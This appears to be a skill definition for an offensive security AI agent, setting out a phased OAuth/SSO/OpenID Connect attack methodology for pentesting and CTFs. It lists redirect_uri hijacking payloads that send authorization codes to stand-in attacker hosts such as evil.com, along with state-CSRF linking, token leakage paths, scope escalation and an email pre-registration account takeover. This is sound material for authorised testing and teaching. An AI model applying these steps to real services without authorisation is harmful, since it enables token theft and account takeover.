---
name: oauth-sso-attack
description: "Attacks on OAuth 2.0 / SSO / OpenID Connect authentication flows. Use when the target has a 'Sign in with Google/GitHub/WeChat' button, a redirect_uri parameter, an authorization_code flow, or a /.well-known/openid-configuration endpoint. Covers redirect_uri hijacking, missing state leading to CSRF, token leakage, and scope escalation"
zh-signals: "针对 OAuth 2.0/SSO/OIDC 认证流程的攻击，涵盖 redirect_uri 劫持、state CSRF 与 token 泄露。信号:OAuth,SSO,OIDC,redirect_uri劫持,token泄露"
when-to-use: "Use when a target exposes third-party login, redirect_uri parameters, authorization_code flows, or OpenID Connect discovery endpoints and you need to test OAuth/SSO weaknesses."
metadata:
  tags: "oauth,sso,openid,oidc,redirect_uri,authorization,token,login,authentication,third-party login,cas,saml"
  category: "exploit"
---

# OAuth/SSO Attack Methodology

OAuth 2.0 is the most common third-party authentication protocol in modern web applications. The attack surface concentrates on each redirect step of the authentication flow — redirect_uri validation, the state parameter, and token delivery.

## ⛔ Further Reading (Must Read)

- Full redirect_uri payloads, token leakage paths, and account takeover flows → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 1: Identify the OAuth Flow

Click the third-party login button and observe `client_id`, `redirect_uri`, `response_type`, `scope`, and `state` in the redirect URL.

Check the endpoints: `/.well-known/openid-configuration`, `/oauth/authorize`, `/api/auth/providers`

## Phase 2: redirect_uri Hijacking (Most Common)

Objective: make the code/token go to the attacker's URL. Quick tests:
```
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://evil.target.com/callback
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://evil.com/steal
```
→ Full payload list → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 3: Missing state → CSRF Attack

When there is no `state` parameter: the attacker obtains a code → crafts a callback link → lures the victim into clicking it → the account gets linked to the attacker's third-party account

## Phase 4: Token Leakage

- **Referer leakage**: the callback page loads external resources → the token leaks through the Referer header
- **Implicit flow**: `response_type=token` → the access_token is in the URL fragment
- **Logs**: the code is in the URL query and may be recorded

## Phase 5: Other Attack Surfaces

- Scope escalation: `scope=openid profile email admin`
- client_secret leakage: check JS source code, GitHub, and configuration files
- Account takeover: email matching and merging → [references/oauth-attack-vectors.md](references/oauth-attack-vectors.md)

## Phase 6: CTF and Account Takeover

### 6.1 OAuth in CTFs
- The focus is redirect_uri bypass, and the flag usually sits in the admin token or a high-privilege scoped API

### 6.2 Account Takeover — Email Pre-Registration Attack
1. The attacker registers `attacker@target.com` (exploiting suffix matching)
2. Changes the email on the third-party platform to the victim's email
3. When the victim logs in via OAuth, the account is automatically linked to the existing account (email match)
4. Key point: check whether the target verifies the email (email verification bypass)
